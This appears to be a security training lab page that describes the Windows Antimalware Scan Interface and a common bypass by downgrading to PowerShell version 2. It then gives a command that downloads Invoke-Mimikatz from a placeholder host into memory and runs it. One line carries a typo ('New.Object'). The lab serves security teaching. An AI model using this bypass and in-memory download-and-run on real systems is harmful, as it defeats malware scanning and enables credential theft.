### Antimalware Scan Interface
The Windows ***Antimalware Scan Interface (AMSI)*** is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. ***AMSI provides enhanced malware protection for end users and their data, applications, and workloads.***

AMSI provides features such as script scanning and behaviour monitoring, and allows detection of script functions that are known to be 'malicious'.

AMSI is integrated into the following components of Windows:

1. User Account Control (UAC) – elevation of EXE, COM, MSI, or ActiveX installation
2. PowerShell – scripts, interactive use, and dynamic code evaluation
3. Windows Script Host – wscript.exe and cscript.exe
4. JavaScript and VBScript
5. Office VBA macros

The following diagram shows the AMSI architecture and how applications and antimalware engines interact with it.

![Antimalware Scan Interface APIs in Windows 10 (Image Credit: Microsoft)](https://il-labforge-assets.origin.immersivelabs.team/uploads/9Wqt06UQWWQ2MMsmYt4fYi1UPJuD8nxnUIejZJ5-qhI.jpeg)

Antimalware Scan Interface APIs in Windows 10 (Image Credit: Microsoft)

### AMSI Bypass
AMSI is a feature introduced in Windows 10 which works with version 5 of PowerShell. There are several bypasses for it; however, in this lab we will be using the most common one. When .NET version 2 is installed, it enables the usage of PowerShell version 2, which does not have support for AMSI. After calling PowerShell version 2, you can then use the ‘fileless malware’ technique presented in the previous lab of this series.

```
# To run the Powershell version 2
powershell.exe -version 2
```

### Note
Once the ***PowerShell 2*** is called, check the version for the confirmation and perform a ***fileless malware*** execution:
```
# Download the 'Invoke-Mimikatz.ps1' file in 'memory'
Invoke-Expression (New.Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-Mimikatz.ps1')

# Once the file is downloaded, you won't be able to list it. Just run the file
Invoke-Mimikatz
```